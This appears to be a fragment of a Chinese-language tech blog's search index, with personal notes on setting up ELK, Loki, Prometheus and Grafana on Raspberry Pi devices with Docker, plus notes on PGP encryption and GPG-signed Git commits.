filebeat wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-7.12.1-amd64.deb sudo apt install ./filebeat-7.12.1-amd64.deb ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:5:1","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"設定檔 /etc/filebeat/filebeat.yml 裡面有很多 input 都disable output預設連到 localhost:9200 的 elasticsearch 假如想用到 logstash 需要手動註解調，並打開logstash output 那邊 請依照需求調整 # 可以看到測試 log filebeat -e # 沒問題的話，service 啟動 sudo service filebeat start ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:5:2","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"相關模組 # 查看可以用的模組 filebeat modules list 這邊先不深入研究 一篇文章搞懂filebeat（ELK） - 一寸HUI - 博客园 GitHub - revolunet/traefik-filebeats-kibana: sample docker-compose with traefik and kibana dashboard using filebeats ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:5:3","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"logstash 和 filebeat 關係 網路上看到 filebeat 都傳送到 logstash 教學比較多 但後來實作發現不是這樣 可以依照需求直接傳到 elasticsearch 甚至可以做到 LoadBalance 傳到 logstash 詳細可以看:搞懂ELK並不是一件特別難的事（ELK） - ⎝⎛CodingNote.cc ⎞⎠ 甚是中間可以搭 Message Queue ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:5:4","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"kibana 設定filebeat 去管理設定 Index Mangament 點選 Create Index Partten step 1 打 filebeat* step 2 選 @timestamp 新增完成，取選 Discover 就可以用 KQL 查詢 不方便截圖，所以這裡就簡單紀錄一下 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:5:5","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"題外話 原本目標， Nginx 抓出 Acess Log 做地圖分析 不過想說安裝細結清楚一點比較好 沒想到就花了不少時間整理 目前查看我這個抓 Access Log GeoIP 方法 從 Nginx 下手取 geoip資訊(經緯度、縣市名稱) Total Nginx monitoring, with application performance and a bit more, using Telegraf/InfluxDB/Grafana. | by Alexey Nizhegolenko | FAUN Logstash Filter GeoIP 模組取得資訊 Grafana展示精美的nginx訪問日誌圖表_小小________ - MdEditor Loki 目前沒有取出來 GeoIP 方法 Add support for Geo IP · Issue #2120 · grafana/loki · GitHub 其實 Logstash 也能跟 Loki 串 Logstash | Grafana Labs 但說真的 Logstash 效能感覺也不是很好(上面測試跑都要花一點時間，我還以為跑失敗) 在樹莓派跑可能也很吃力 本來想用 docker 執行看看，但官方沒有做 arm 版本 就不測試了 docker run -it --rm logstash:7.12.1 logstash -e 'input { stdin { } } output { stdout {} }' GeoIP 哪貼心血來潮再進行測試 這部分也沒有現成包好 docker 可以直接玩 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:6:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["ELK"],"content":"其他不錯文章 ElasticSearch 全文检索技术（一） - 简书 logstash 和filebeat 是什么关系？ - 知乎 MongoDB和Elasticsearch的对比 | Leriou’s Tavern 搞懂ELK並不是一件特別難的事（ELK） - ⎝⎛CodingNote.cc ⎞⎠ 关于kibana的可视化可能都在这篇文章里了 - SegmentFault 思否 Kibana7.9.2设置elasticsearch索引过期时间，到期自动删除_螺蛳粉不加葱的博客-CSDN博客_es设置索引过期时间 [Elasticsearch] 基本概念 \u0026 搜尋入門 | 小信豬的原始部落 ","date":"2021-05-02","objectID":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/:7:0","tags":["elasticsearch","logstash","kibana","filebeat"],"title":"安裝 ELK(ElasticSearch,Logstash,Kibana),filebeat 初體驗","uri":"/blog/posts/%E5%AE%89%E8%A3%9D-ELK-ElasticSearch-Logstash-Kibana-filebeat-%E5%88%9D%E9%AB%94%E9%A9%97/"},{"categories":["Loki"],"content":"最近在三台樹莓派使用 Docker 架設服務 但是查看 log 真的不是很方便 最近剛完 Prometheus 看到 Loki 跟 Prometheus 很像，又是跟 Container 很有關係 看了一下部署流程，並不是非常難 所以就食做看看 使用官方 docker-compose loki/docker-compose.yaml at master · grafana/loki · GitHub grafana 帳號密碼為 admin/admin 進去新加 datasource 為 loki 這樣就算部屬完成 Grafana 要點選 expore 才能看到日誌 version: \"3\" networks: loki: services: loki: image: grafana/loki:2.0.0 ports: - \"3100:3100\" command: -config.file=/etc/loki/local-config.yaml networks: - loki promtail: image: grafana/promtail:2.0.0 volumes: - /var/log:/var/log command: -config.file=/etc/promtail/config.yml networks: - loki grafana: image: grafana/grafana:latest ports: - \"3000:3000\" networks: - loki 本機是linux 的話， /var/log/底下都會傳到 loki 日誌去 可以用 volume 把日誌掛到 containr 那邊去 應該也有一樣的效果 不過我下面還有比較好的方法 加 loki datasource 和 explore操作 Loki轻量级日志系统_Kammingo的博客-CSDN博客 輕量級日誌系統Loki原理簡介和使用_平凡人筆記 - MdEditor 使用 Loki 搭建个人日志平台 | 血衫非弧の一存 ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:0:0","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Loki"],"content":"docker 實作 Loki 日誌 再 container 把日誌輸出來不是很方便 所以我們是使用 docker 直接輸出日誌 可算非常方便 參考來源: loki收集docker容器里运行服务的日志,loki+grafana_十个菜-CSDN博客 docker swarm结合loki搭建轻量级日志监控系统 - 琴弦上的尼古丁 ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:1:0","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Loki"],"content":"安裝 docker loki driver Docker driver | Grafana Labs docker plugin install grafana/loki-docker-driver:latest --alias loki --grant-all-permissions # 完成可用這個指令 docker plugin ls 相關升級、移除可以在官網看到 其他 Loki | 数据过期自动删除策略设计 - 华为云 比較有趣看到yaml 模板寫法 version: \"3.4\" x-logging: \u0026loki-logging driver: loki options: loki-url: \"http://YOUR_IP:3100/loki/api/v1/push\" max-size: \"50m\" max-file: \"10\" services: host: container_name: grafana image: grafana/grafana environment: - TZ=Asia/Shanghai - LANG=zh_CN.UTF-8 logging: *loki-logging # ———————————————— # 版权声明：本文为CSDN博主「2018_like菜」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。 # 原文链接：https://blog.csdn.net/u014756339/article/details/111992382 ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:1:1","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Loki"],"content":"樹莓派安裝法 參考:docker plugin enable Loki gives an error · Issue #974 · grafana/loki · GitHub 嚐試安裝 docker plugin install grafana/loki-docker-driver:latest --alias loki --grant-all-permissions 看到錯誤 Error response from daemon: dial unix /run/docker/plugins/61d4906b35d0d106db69561446160ba63bddb5f9a30d765293ddc75d11a6935b/loki.sock: connect: no such file or directory git clone loki git clone --depth=1 https://github.com/grafana/loki.git 在 loki 資料夾輸入 # 安裝 golang sudo apt install golang # 編譯 GOOS=linux GOARCH=arm GOARM=7 go build ./cmd/docker-driver 樹莓派 build 一直失敗，後來發想到 Golang 也是跨平台 所以我在x86主機編譯順利。 編譯檔案(docker-driver)複製到/var/lib/docker/plugins/\u003cALPHA_NUMERIC_FOLDER\u003e/rootfs/bin 把編譯好的 docker-driver， sudo ls /var/lib/docker/plugins/ # 有一個很長編碼資料夾就是 啟動 docker plugin docker plugin enable loki 這邊之前啟動的 docker containr 要刪掉重新起新的 container 才會有用 ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:2:0","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Loki"],"content":"全局設定 編輯daemon.json。linux下默認路徑是/etc/docker/daemon.json (需要sudo)， windows則默認是%userprofile%.docker\\daemon.json { \"log-driver\": \"loki\", \"log-opts\": { \"loki-url\": \"http://YOUR_IP:3100/loki/api/v1/push\", \"max-size\": \"50m\", \"max-file\": \"10\" }, \"registry-mirrors\": [\"https://registry.docker-cn.com\"] } 參考:loki收集docker容器裡運行服務的日誌,loki+grafana_十個菜-CSDN博客 ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:2:1","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Loki"],"content":"各自設定 在 docker-compose 裡面加 logging version: \"3.7\" services: logger: image: grafana/grafana logging: driver: loki options: loki-url: \"http://localhost:3100/loki/api/v1/push\" 就可以完成 指令可以用 docker run --rm --name=grafana --log-driver=loki --log-opt loki-url=\"http://YOUR_IP:3100/loki/api/v1/push\" --log-opt max-size=50m --log-opt max-file=10 grafana/grafana # --log-driver=loki指定日志驱动器为loki # --log-opt loki-url则指定了loki的url # --log-opt max-size日志最大大小 # --log-opt max-file日志文件最大数量 參考:* loki收集docker容器里运行服务的日志,loki+grafana_十个菜-CSDN博客 ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:2:2","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Loki"],"content":"使用 Loki 做 Traefik Acess Log 分析 loki 架好後，相關 docker log 設定完 Grafana 設定好 loki 資源 這邊記得把 traefik access log 改成 json #traefik - \"--accesslog.format=json\" import 這個 dashboard Traefik Via Loki dashboard for Grafana | Grafana Labs 還要把 json 內容裡面 label 改掉 {job=\\\"/var/log/traefik.log\\\"} 換成(這邊換成你電腦相對位置) {container_name=\\\"rpi-traefik_traefik_1\\\",host=\\\"PI202\\\"} Traefik 2 监控系统之Grafana Prometheus Promtail Loki完美结合 - 简书 詳細也可以看這篇，也寫得很完整 也有看到非常強的 dashboard Loki v2 Web Analytics Dashboard for NGINX dashboard for Grafana | Grafana Labs ","date":"2021-04-18","objectID":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/:3:0","tags":["loki","traefik","docker","log","grafana"],"title":"Loki 初體驗教學(在Raspberry 啟用 Docker-Loki-Driver)","uri":"/blog/posts/Loki-%E5%88%9D%E9%AB%94%E9%A9%97%E6%95%99%E5%AD%B8/"},{"categories":["Docker"],"content":"之前這篇有提到 cp 指令Docker 新手筆記 | 程式狂想筆記 但一直找有什麼方便複製 image 檔案 今天看到相關網站方法 整理出來 docker create --name prom_empty prom/prometheus # docker create ：創建一個新的容器但不啟動它 docker cp prom_empty:/etc/prometheus/prometheus.yml ./prometheus.yml 參考:Monitor your Raspberry Pi cluster with Prometheus and Docker ","date":"2021-04-15","objectID":"/blog/posts/%E6%8A%93%E5%87%BA-Docker-%E8%A3%A1%E9%9D%A2%E6%AA%94%E6%A1%88%E8%A8%AD%E5%AE%9A%E6%AA%94%E5%87%BA%E4%BE%86/:0:0","tags":["docker"],"title":"抓出 Docker 裡面檔案設定檔出來","uri":"/blog/posts/%E6%8A%93%E5%87%BA-Docker-%E8%A3%A1%E9%9D%A2%E6%AA%94%E6%A1%88%E8%A8%AD%E5%AE%9A%E6%AA%94%E5%87%BA%E4%BE%86/"},{"categories":["Git"],"content":"最近因緣際會下用到 PGP 因為我們公司有用 gitlab 之前就想研究 Git 簽章怎麼用 但一直都沒有去嘗試 最近碰到 PGP 加密 竟然碰到相關問題，馬上使用看看 Git mail 使用者名稱都可以自己改上傳 使用簽章後，能證明GIT commit 是誰做的 本篇是以方便使用 GUI 介面操作(Gitkrakn) 並非以指令方式去做 相關指令推薦爬相關專業文章 ","date":"2021-04-11","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/:0:0","tags":["git","pgp"],"title":"使用 GitKrakn GIT 簽章(PGP)","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/"},{"categories":["Git"],"content":"相關 command 教學 Commit Signing with gpg - GitKraken Documentation 如何使用 GPG (GnuPG) 對 Git Commit 與 Tag 進行簽章 | The Will Will Web 利用 GPG 簽署 git commit | Puck’s Blog ","date":"2021-04-11","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/:1:0","tags":["git","pgp"],"title":"使用 GitKrakn GIT 簽章(PGP)","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/"},{"categories":["Git"],"content":"簡單教學 其實還滿簡單 在 window 安裝 gpg4win 設定 gitkrakn 那邊按 Generate (基本上指令可以打GPG就不需要設定) GitLab 設定把公鑰用到上面就可以驗證過了，但注意 git mail 名稱要跟 gitlab mail 一樣 sign commits by default 記得要打勾 雖然我還沒找到手動 commit 簽章選項 有找到再回來寫 New added PGP key is unverified (#37572) · Issues · GitLab.org / GitLab FOSS · GitLab 這邊注意簽章信箱要跟gitlab 一樣才不會有問題 ","date":"2021-04-11","objectID":"/blog/posts/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/:2:0","tags":["git","pgp"],"title":"使用 GitKrakn GIT 簽章(PGP)","uri":"/blog/posts/%E4%BD%BF%E7%94%A8-GitKrakn-GIT-%E7%B0%BD%E7%AB%A0-PGP/"},{"categories":["Java"],"content":"第一次使用 PGP加密筆記，原本看到 GPG 跟 Git 做簽章 想說GPG 跟 PGP 應該沒甚麼關係 但是後來爬文一下，GPG(GunPG)是產生和管理 PGP 金鑰軟體 看來有空順便來研究 GIT 簽章 ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:0:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"測線上加密網站 https://github.com/Gaff/pgp.help pgp.help - Modern javascript client-side PGP encryption and decryption tool SmartNinja Online PGP 5 Online PGP Encryption Websites Free to Encrypt Email, Text PGPTool - use this tool to encrypt and decrypt PGP files. OpenPGP compatible ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:1:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"測試 pgp 加解密 簡單來講，就次把private key 和 public key 匯入到 gpg 然後使用 gpg --import {private/public key} # 加密： # recipient指定接收者的公鑰ID gpg --recipient {keyid/uid} --output encrypt.txt --encrypt input.txt # 也可以按喜好加上--armor選項等 # 我更喜歡用 gpg -se -o encrypt.txt -r {keyid/uid} input.txt # s代表簽名 e代表加密 # o是 將結果 輸出到檔案 encrypt.txt # r後面跟 接收者的 uid或者 key id， 接收者的公鑰必須已經匯入過 # input.txt 是你要加密的檔案 # 解密： gpg --output decrypt.txt --decrypt encrypt.txt # 也可以 gpg -d encrypt.txt # 輸出到終端 直接檢視 2021年，用更現代的方法使用PGP（上）_UCloud雲端計算 - MdEditor 後來發現原始文章，放在下面 [GnuPG] gpg 金鑰管理 · Hello, World! GPG(GunPG)的使用 | Bolog PGP，OpenPGP和GnuPG加密之間的區別 – 易璽科技 ECNETWORKER ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:2:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"看起來實用工具 Java GPG解密关于:encrypted message contains a signed message - not literal data.的解决_程序地带 Kleopatra - OpenPGP Gpg4win - 維基百科，自由的百科全書 GnuPG: 核心加密工具 Kleopatra: 用於OpenPGP與X.509的憑證管理。 GPA: 另一個可選的憑證管理 GpgOL: Microsoft Outlook外掛程式，用於電子郵件加密 GpgEX: Windows Explorer外掛程式，用於檔案加密 Gpg4win Compendium: Gpg4win2的文件 GnuPG - Software list ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:3:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"更多 GPG 教學 目前只有使用加解密跟 GIT 簽章 不過好像還有更進階用法 但是…目前好像用不太到 先預留一下爬到不錯文章 2021年，用更现代的方法使用PGP（上） - C的博客 |UlyC 備份圖 2021年，用更现代的方法使用PGP（中） - C的博客 |UlyC 備份圖 2021年，用更现代的方法使用PGP（下） - C的博客 |UlyC 備份圖 ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:4:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"InvalidKeyException: Illegal key size(測試解決成功) 要安裝 JCE，原本不相信，但真的測試嚇一跳。還真的要安裝… PS: 我專案是Java1.7，1.8竟然可以跑 InvalidKeyException: Illegal key size异常解决方案 – 思码老徐 关于PGP解密基于Java Bouncy Castle_-0.0-的博客-CSDN博客 新增 Git GPG Key 增加安全性 - Askie’s Coding Life ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:5:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":["Java"],"content":"Java PGP Encryption/Decryption in Java | Waiting for Wit ","date":"2021-04-11","objectID":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/:6:0","tags":["java","pgp","gpg"],"title":"PGP 筆記","uri":"/blog/posts/PGP-%E7%AD%86%E8%A8%98/"},{"categories":null,"content":"參考:docker-prometheus/docker-compose.yml at master · Kev1nChan/docker-prometheus · GitHub 使用 Raspberry Pi 3/4 注意使用 32 位元都會有機會遇到記憶體問題 建議使用 64 bit uname -m 不是 arrch64 都是 32bit ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:0:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"架設 Prometheus 調整部份 Raspberry PI version: '3.3' volumes: prometheus_data: {} grafana_data: {} networks: monitoring: driver: bridge services: prometheus: image: prom/prometheus:v2.26.0 container_name: prometheus restart: always volumes: - /etc/localtime:/etc/localtime:ro - $PWD/prometheus/:/etc/prometheus/ - prometheus_data:/prometheus command: - '--config.file=/etc/prometheus/prometheus.yml' - '--storage.tsdb.path=/prometheus' - '--web.console.libraries=/usr/share/prometheus/console_libraries' - '--web.console.templates=/usr/share/prometheus/consoles' networks: - monitoring links: - alertmanager - cadvisor expose: - '9090' ports: - 9090:9090 depends_on: - cadvisor alertmanager: image: prom/alertmanager:v0.21.0 container_name: alertmanager restart: always volumes: - /etc/localtime:/etc/localtime:ro - $PWD/alertmanager/:/etc/alertmanager/ command: - '--config.file=/etc/alertmanager/config.yml' - '--storage.path=/alertmanager' networks: - monitoring expose: - '9093' ports: - 9093:9093 cadvisor: image: budry/cadvisor-arm:latest #gcr.io/cadvisor/cadvisor:v0.39.0 container_name: cadvisor restart: always volumes: - /etc/localtime:/etc/localtime:ro - /:/rootfs:ro - /var/run:/var/run:rw - /sys:/sys:ro - /var/lib/docker/:/var/lib/docker:ro networks: - monitoring expose: - '8080' node_exporter: image: quay.io/prometheus/node-exporter:latest #prom/node-exporter:v0.18.0 container_name: node-exporter restart: always volumes: - /etc/localtime:/etc/localtime:ro - /proc:/host/proc:ro - /sys:/host/sys:ro - /:/rootfs:ro command: - '--path.procfs=/host/proc' - '--path.sysfs=/host/sys' - --collector.filesystem.ignored-mount-points - \"^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)\" networks: - monitoring expose: - '9100' grafana: image: grafana/grafana:7.5.2 user: \"104\" container_name: grafana restart: always volumes: - /etc/localtime:/etc/localtime:ro - grafana_data:/var/lib/grafana - $PWD/grafana/provisioning/:/etc/grafana/provisioning/ env_file: - $PWD/grafana/config.monitoring networks: - monitoring links: - prometheus ports: - 3000:3000 depends_on: - prometheus 接下來設定在 Grafana 設定 Promethus Datasource 設定 就完成了 相關 alertmanager 調整請看 15分鐘建製 Promethus 環境 ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:1:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"Node Exporter 我原本以為 Node Exporter 要抓本機機器一定要用 Systemd 去執行程式 但看範例是用 Docker 感覺不一定要用 Systemd 這邊我機器都有安裝 Docker 所以我就沒選則用這個方式 使用 Systemd 方式記錄一下 可參考 node_exporter 配置 - 简书 Installing node_exporter as systemd serivice · GitHub sudo tee /etc/systemd/system/node_exporter.service \u003c\u003c\"EOF\" [Unit] Description=Node Exporter [Service] User=node_exporter Group=node_exporter EnvironmentFile=-/etc/sysconfig/node_exporter ExecStart=/usr/local/bin/node_exporter $OPTIONS [Install] WantedBy=multi-user.target EOF docker 要怎麼用呢? 其實上面就寫了 官方寫法跟我的有點不太一樣 docker run -d \\ --net=\"host\" \\ --pid=\"host\" \\ -v \"/:/host:ro,rslave\" \\ quay.io/prometheus/node-exporter:latest \\ --path.rootfs=/host --- version: '3.8' services: node_exporter: image: quay.io/prometheus/node-exporter:latest container_name: node_exporter command: - '--path.rootfs=/host' network_mode: host pid: host restart: unless-stopped volumes: - '/:/host:ro,rslave' 這邊不太明白 network_mode 要用 host 模式? 最我我選擇調整別台使用 docker --- version: '3.8' services: node_exporter: image: quay.io/prometheus/node-exporter:latest container_name: node-exporter restart: always volumes: - /etc/localtime:/etc/localtime:ro - /proc:/host/proc:ro - /sys:/host/sys:ro - /:/rootfs:ro command: - '--path.procfs=/host/proc' - '--path.sysfs=/host/sys' - --collector.filesystem.ignored-mount-points - \"^/(sys|proc|dev|host|etc|rootfs/var/lib/docker/containers|rootfs/var/lib/docker/overlay2|rootfs/run/docker/netns|rootfs/var/lib/docker/aufs)($$|/)\" expose: - '9100' dockr-compose up 起來 prometheus/config.yml 修改 - job_name: 'node-exporter' # Override the global default and scrape targets from this job every 5 seconds. # metrics_path defaults to '/metrics' # scheme defaults to 'http'. scrape_interval: 5s static_configs: - targets: - 'node_exporter:9100' - '192.168.1.xx:9100' - '192.168.1.xx:9100' 有遇到 ERROR: Version in \"./docker-compose.yml\" is unsupported. You might be seeing this error because you're using the wrong Compose file version. Either specify a supported version (e.g \"2.2\" or \"3.3\") and place your service definitions under the `services` key, or omit the `version` key and place your service definitions at the root of the file to use version 1. For more on the Compose file format versions, see https://docs.docker.com/compose/compose-file/ 請更新 docker-compose version armv6 (pi 1 ) 不能跑 自己找網路上 build 都失敗 仔細想想，真的 PI 效能真的很低 所以就不放這個了 1 Node Exporter for Prometheus Dashboard CN v20201010 dashboard for Grafana | Grafana Labs Node Exporter Full dashboard for Grafana | Grafana Labs ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:2:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"tranmission GitHub - sandrotosi/simple-transmission-exporter: A simple Prometheus exporter for Transmission GitHub - metalmatze/transmission-exporter: Prometheus exporter for Transmission metrics, written in Go. 仔細看了一下 dashboard 兩個差異還滿大的 主要我是要看網路傳輸速度 所以我這邊選擇 python 版本 git clone https://github.com/sandrotosi/simple-transmission-exporter.git # 修改 Dockerfile 為 arm32v7 FROM arm32v7/python:3.9 ... docker build -t transmission_exporter . docker run -e TRANSMISSION_HOST=192.168.x.x \\ -e TRANSMISSION_PORT=9091 \\ -e TRANSMISSION_USERNAME=admin \\ -e TRANSMISSION_PASSWORD=xxx \\ -d -p 29091:29091 transmission_exporter prometheus 設定增加後，重啟服務docker-compose restart prometheus - job_name: 'transmission-exporter' # Override the global default and scrape targets from this job every 5 seconds. # metrics_path defaults to '/metrics' # scheme defaults to 'http'. static_configs: - targets: - '192.168.1.203:29091' 調整成 docker-compose 換成 docker-compose 就不能運作了… 但一般docker 指令可正常執行… 真的很奇怪 version: '2' services: transmission_exporter: build: context: . dockerfile: Dockerfile image: transmission_exporter container_name: transmission_exporter ports: - \"29091:29091\" environment: - \"TRANSMISSION_HOST=192.168.1.203\" - \"TRANSMISSION_PORT=9091\" - \"TRANSMISSION_USERNAME=admin\" - \"TRANSMISSION_PASSWORD=admin\" 20210408 後來發現 docker-compose up 起來 IP 好像不一樣 所以才不能跑 看 transmission 設定有一個設定白名單 \"rpc-whitelist\": \"127.0.0.1,192.168.1.*,172.17.0.*\", \"rpc-whitelist-enabled\": true, 172.17.0.* 預設會過 但是 docker-compose 起來不是這段 IP 透過 Docker Compose 設定 network | Titangene Blog 目前指令不先研究怎麼使用 最快方法就是把IP調成172.*.*.* ","date":"2021-04-05","objectID":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/:3:0","tags":null,"title":"Raspberry Pi 部屬 Prometheus","uri":"/blog/posts/Raspberry-Pi-%E9%83%A8%E5%B1%AC-Prometheus/"},{"categories":null,"content":"traefik command: - \"--api.insecure=true\" ....(省略) - \"--accesslog=true\" - \"--metrics.prometheus=true\" 原生 traefik 就有支援 prometheus 加上這個--metrics.prometheus=true就能使用 granafan 加表Traefik dashboard for Grafana | Grafana Labs會看到 Panel plugin not found: grafana-piechart-panel docker-traefik-prometheus/config.monitoring at master · vegasbrianc/docker-traefik-prometheus · GitHub 這邊有看到跑 docker 前 可以在這邊設定這個 這樣可以忽略下面安裝 plugin [root@prometheus prometheus]# grafana-cli plugins install grafana-piechart-panel installing grafana-piechart-panel @ 1.6.1 from: 